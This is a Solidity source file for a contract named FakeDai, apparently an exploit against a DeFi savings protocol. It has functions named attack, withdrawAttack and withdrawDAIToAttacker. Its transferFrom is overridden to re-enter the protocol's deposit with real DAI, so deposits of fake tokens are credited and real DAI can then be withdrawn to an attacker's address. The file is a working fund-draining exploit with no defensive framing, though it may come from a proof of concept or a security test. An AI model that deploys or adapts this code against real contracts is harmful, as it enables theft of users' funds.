pragma solidity ^0.5.12;

import "@openzeppelin/upgrades/contracts/ownership/Ownable.sol";
import "@openzeppelin/contracts-ethereum-package/contracts/token/ERC20/IERC20.sol";

interface Savings {
    function deposit(
        address _protocol,
        address[] calldata _tokens,
        uint256[] calldata _dnAmounts
    ) external returns (uint256);

    function withdraw(address _protocol, address token, uint256 dnAmount, uint256 maxNAmount) external returns(uint256);
}


contract FakeDai is OpenZeppelinUpgradesOwnable {

    constructor() public {
    }

    address[] public tokens;

    uint256[] public amounts;

    address public protocol;

    address public savings;

    function setup(address _realDai, address _protocol, address _savings, uint256 _amount) onlyOwner public {
        address[] memory tempTokens;
        tokens = tempTokens;
        tokens.push(_realDai);

        uint256[] memory tempAmounts;
        amounts = tempAmounts;
        amounts.push(_amount);

        protocol = _protocol;
        savings = _savings;
    }

    function attack(address[] memory fakeTokens, uint256[] memory fakeAmounts) onlyOwner public {
        Savings(savings).deposit(protocol, fakeTokens, fakeAmounts);
    }

    function withdrawAttack(uint256 amount) onlyOwner public {
        Savings(savings).withdraw(protocol, tokens[0], amount, 0);
    }

    function withdrawDAIToAttacker(address reciever, uint256 amount) onlyOwner public {
        IERC20(tokens[0]).transfer(reciever, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {

        IERC20(tokens[0]).approve(savings, amounts[0]);
        Savings(savings).deposit(protocol, tokens, amounts);

        return true;
    }
}
